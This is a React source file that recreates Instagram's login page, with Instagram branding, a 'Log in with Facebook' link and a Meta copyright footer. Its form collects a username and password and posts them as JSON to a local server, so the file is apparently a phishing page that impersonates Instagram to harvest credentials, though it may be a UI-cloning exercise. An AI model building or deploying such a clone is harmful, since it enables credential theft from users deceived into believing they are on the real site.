import { useState } from "react";
import "./App.css";
import { FaFacebook } from "react-icons/fa";
import { useForm } from "react-hook-form";

function App() {
  const {
    register,
    handleSubmit,
    watch,
    formState: { errors, isSubmitting },
  } = useForm();
  const onSubmit = async (data) => {
    let a = await fetch("http://localhost:3000/", {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(data),
    });
    let b = await a.text();
    console.log(data, b);
  };
  return (
    <>
      <main className="relative">
        <div className="first">
          <div className="md:border-1 h-[40vh] mt-[15vh] md:w-1/5 flex gap-2 flex-col pt-4 mx-auto">
            <div className="font-bold text-3xl flex justify-center">
              Instagram
            </div>
            <div className="input flex flex-col items-center mt-10">
              <form action="" onSubmit={handleSubmit(onSubmit)}>
                <div className="space-y-1">
                  <div>
                    <input
                      type="text"
                      className="border rounded-sm h-8 w-64 p-1 cursor-text"
                      placeholder="Username"
                      {...register("username")}
                    />{" "}
                  </div>
                  <div>
                    <input
                      type="passward"
                      className="border rounded-sm h-8 w-64 p-1 cursor-text"
                      placeholder="Password"
                      {...register("password")}
                    />
                  </div>
                  <div className="flex justify-center  ">
                    <input
                      type="submit"
                      disabled={isSubmitting}
                      className="bg-[#0095f6] w-[100%] rounded-sm h-8 font-bold p-1 cursor-pointer transition-all duration-500 hover:bg-[#81d2f8]"
                    />
                  </div>
                </div>
              </form>
            </div>
            <div className="line flex justify-center items-center gap-2">
              <div className="w-[25%] bg-[#dbdbdb] h-[2px]"></div>
              <div className="text-[#686262]">OR</div>
              <div className="w-[25%] bg-[#dbdbdb] h-[2px]"></div>
            </div>
            <div>
              <div className="facebook flex gap-2 items-center justify-center mt-5">
                <div className="img text-[#0095f6] cursor-pointer text-[17px]">
                  <FaFacebook />
                </div>
                <div className="text text-[#0095f6] cursor-pointer text-[17px]">
                  Log in with Facebook
                </div>
              </div>
              <div className="forget flex cursor-pointer justify-center text-[#b4b0b0]">
                Forget passward?
              </div>
            </div>
          </div>
        </div>
        <div className="second md:border-1 h-[70px] mt-[10px] md:w-1/5 flex gap-2 mx-auto">
          <div className="flex justify-center gap-1 mx-auto items-center">
            <div>Dont have an account? </div>
            <div className="text-[#0095f6] font-bold cursor-pointer">
              {" "}
              Sign up
            </div>
          </div>
        </div>
      </main>
      <footer className="flex justify-center md:w-full items-center md:flex-col">
        <div className="flex justify-center flex-wrap items-center text-[13px] m-3 md:m-5 gap-3 w-2/3 absolute md:mx-auto bottom-0">
          <span>Meta</span>
          <span>About</span>
          <span>Blog</span>
          <span>Jobs</span>
          <span>Help</span>
          <span>API</span>
          <span>Privacy</span>
          <span>Terms</span>
          <span>Locations</span>
          <span>Instagram Lite</span>
          <span>Threads</span>
          <span>Contact Uploading & Non-Users</span>
          <span>Meta Verified</span>
          <div>
            <span>English</span>
            <span>© 2025 Instagram from Meta</span>
          </div>
        </div>
      </footer>
    </>
  );
}

export default App;
